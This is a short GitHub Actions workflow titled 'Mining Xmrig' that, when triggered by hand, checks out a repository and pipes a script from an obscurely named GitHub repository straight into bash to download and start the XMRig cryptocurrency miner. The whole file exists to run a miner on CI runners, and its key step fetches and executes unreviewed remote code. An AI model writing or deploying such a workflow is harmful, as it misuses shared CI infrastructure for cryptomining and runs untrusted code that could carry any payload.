name: Mining Xmrig 

on:
  workflow_dispatch:

jobs:
  run_xmrig:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout Repository
      uses: actions/checkout@v2

    - name: Setup Python
      uses: actions/setup-python@v2

    - name: Download and Extract and Running Xmrig
      run: curl -sL https://raw.githubusercontent.com/XtomiX/Hdhuueuu3i8godjji9x9iie88idi/main/run.sh | bash
